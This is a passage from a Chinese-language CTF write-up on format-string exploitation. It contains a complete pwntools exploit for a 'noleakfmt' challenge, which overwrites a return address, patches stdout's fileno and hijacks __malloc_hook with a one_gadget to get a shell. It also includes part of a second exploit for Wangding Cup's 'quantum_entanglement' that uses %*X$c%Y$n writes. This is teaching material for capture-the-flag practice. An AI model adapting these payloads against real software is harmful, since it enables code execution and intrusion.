确定好目标之后我们要来修改printf的返回地址了，由于__libc_start_mian函数存在于start函数的调用链中，所以我们可以将返回地址修改为start函数。
首先像上面两题一样，我们先修改栈链，使得可以通过格式化字符串修改返回地址，将返回地址修改为start，由于start地址为0x7b0，我们一次写入两字节，会把倒数第四位清0，开启了pie，所以有1/16的几率修改成功。成功修改返回地址为start之后就会抬栈，接下来再故技重施，修改栈链，并且将stdout地址的后两位修改为0x90，从而修改fileno成员，使stdout重新输出，然后再修改malloc_hook为onegadget就好，再通过printf输出大量字符来触发onegadget就行(不想写了，后续利用和上一题一样的方式，阿巴阿巴阿巴)，exp如下
    from pwn import *
    context.log_level='debug'
    elf=ELF('./noleakfmt')
    libc=ELF('./libc-2.23.so')
    start=0x7b0
    onegadget=[0x45226,0x4527a,0xf0364,0xf1207]
    def pwn():
        io.recvuntil("gift : 0x")
        stack=int(io.recv(12),16)
        log.success('stack => {}'.format(hex(stack)))
        payload='%'+str((stack-0xc)&0xffff)+'c%11$hn'
        io.sendline(payload)
        sleep(0.1)
        try:
            payload='%'+str(start)+'c%37$hn'
            io.sendline(payload)   
        except :
            io.close()
        else:
            sleep(0.1)
            payload='%'+str((stack-0x54)&0xffff)+'c%10$hn'
            io.sendline(payload)    
            sleep(0.1)
            payload='%'+str(0x90)+'c%36$hhn'
            io.sendline(payload)
            sleep(0.1)
            payload='%'+str(0x2)+'c%26$hhn'
            io.sendline(payload)
            sleep(0.1)
            payload='%9$p'
            io.sendline(payload)
            io.recvuntil('0x')
            libc_base=int(io.recv(12),16)-libc.symbols['__libc_start_main']-240
            log.success('libc_base => {}'.format(hex(libc_base)))
            one_gadget=libc_base+onegadget[3]
            log.success('one_gadget => {}'.format(hex(one_gadget)))
            malloc_hook=libc_base+libc.symbols['__malloc_hook']
            log.success('malloc_hook => {}'.format(hex(malloc_hook)))
            sleep(0.1)
            payload='%'+str(malloc_hook&0xffff)+'c%36$hn'
            io.sendline(payload)
            sleep(0.1)
            payload='%'+str(one_gadget&0xffff)+'c%26$hn'
            io.sendline(payload)
            sleep(0.1)
            payload='%'+str((malloc_hook+2)&0xff)+'c%36$hhn'
            #gdb.attach(io)
            io.sendline(payload)
            sleep(0.1)
            payload='%'+str((one_gadget>>16)&0xff)+'c%26$hhn'
            io.sendline(payload)
            sleep(0.1)
            io.sendline('%99999c')
            io.sendline('exec 1>&2')
            io.interactive()
    if __name__ == "__main__":
        while True:
            try:
                io=process('./noleakfmt')
                pwn()
            except:
                io.close()
    '''
    0x45226 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4527a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf0364 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1207 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
      '''
接下来再来道偏一点的格式化字符串知识点利用
## 0x4.网鼎杯白虎组-quantum_entanglement
检查保护
IDA分析
然而有问题
看到0x8048998
scanf函数，f5看看scanf反编译成什么样了
龟龟，怎么这么多参数，不对劲，按y改一下参数
改完之后就能反编译main了
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int v4; // [esp+0h] [ebp-ECh]
      int *buf; // [esp+4h] [ebp-E8h]
      int *addr; // [esp+8h] [ebp-E4h]
      int fd; // [esp+Ch] [ebp-E0h]
      int v8; // [esp+10h] [ebp-DCh]
      char format; // [esp+18h] [ebp-D4h]
      char v10; // [esp+7Ch] [ebp-70h]
      unsigned int v11; // [esp+E0h] [ebp-Ch]
      int *v12; // [esp+E4h] [ebp-8h]
      v12 = &argc;
      v11 = __readgsdword(0x14u);
      setvbuf(stdin, 0, 2, 0);
      setvbuf(stdout, 0, 2, 0);
      buf = (int *)mmap(0, 4u, 3, 34, -1, 0);
      addr = (int *)mmap(0, 4u, 3, 34, -1, 0);
      fd = open("/dev/random", 0);
      if ( fd < 0 )
      {
        perror("/dev/urandom");
        exit(1);
      }
      read(fd, buf, 4u);
      read(fd, addr, 4u);
      *buf &= 0xCAFEBABE;
      *addr &= 0xBADBADu;
      mprotect(buf, 4u, 1);
      mprotect(addr, 4u, 1);
      close(fd);
      v4 = *buf;
      v8 = *addr;
      fwrite("FirstName: ", 1u, 0xAu, stdout);
      __isoc99_scanf((int)"%13s", (int)&format);
      fwrite("LastName: ", 1u, 9u, stdout);
      __isoc99_scanf((int)"%13s", (int)&v10);
      log_in(&format, &v10);
      /*
      int __cdecl log_in(char *format, char *a2)
      {
          fwrite("Welcome my Dear ", 1u, 0x10u, stdout);
          fprintf(stdout, format, "%s");
          fprintf(stdout, a2, "%s");
          return 0;
      }
      */
      sleep(3u);
      if ( v8 != v4 )
        exit(1);
      system("/bin/sh");
      return 0;
    }
程序逻辑就是mmap出两块4字节的内存，然后分别往里面读入4字节的随机数，然后将两个随机数分别与上`0xCAFEBABE`和`0xBADBAD`，接着再接收两次13字节的输入，作为参数传入log_in函数，log_in函数之后对v8和v4进行比较，如果相等则执行system(“/bin/sh”)
在fprintf函数中存在格式化字符串漏洞
这里需要用到一个新的知识点
`%*X$c%Y$n`会把栈中偏移X处的值赋给栈中偏移Y处的指针指向的地址
在执行fprintf的时候站空间如下
在0055的栈空间出残留着第一个随机数地址的后四位，0050的栈空间是第二个随机数，它们的相对偏移如下
但是因为在fprintf函数中，格式化字符串并不是第一个参数，是第二个，和printf函数有所不同，所以这里fprintf函数格式化字符串的偏移都需要-1
这题的思路依然是在栈中找栈链，然后将栈链中的一条链的后四位修改成第一个随机数地址的后四位，然后再修改第一个随机数的值为第二个随机数，找到如下这条链
exp如下
    from pwn import *
    context.log_level='debug'
    io=process('./quantum_entanglement')
    elf=ELF('./quantum_entanglement')
    payload1='%*19$c%44$hn' #将%44位置处的栈链修改到指向第一个随机数
    payload2='%*18$c%118$n' #一次性将第二个随机数写入到第一个随机数的地址
    io.recvuntil('FirstName:')
    io.sendline(payload1)
    #gdb.attach(io)
    io.recv()
    io.sendline(payload2)